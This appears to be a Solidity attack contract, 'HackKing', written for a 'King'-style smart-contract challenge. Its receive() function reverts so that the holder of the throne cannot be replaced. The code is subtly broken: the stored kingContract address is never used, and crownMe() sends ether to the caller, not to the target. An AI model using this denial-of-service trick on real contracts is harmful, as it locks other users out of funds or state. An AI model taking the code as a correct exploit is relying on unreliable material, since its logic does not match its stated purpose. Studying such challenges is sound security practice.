// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract HackKing {
  address public kingContract;

  constructor(address _kingContract) public payable {
    kingContract = _kingContract;
  }

  function crownMe(uint _amount) public {
    (bool success, ) = msg.sender.call.value(_amount)("");
    require(success, "Transfer failed.");
  }

  receive() external payable {
    revert();

  }

}
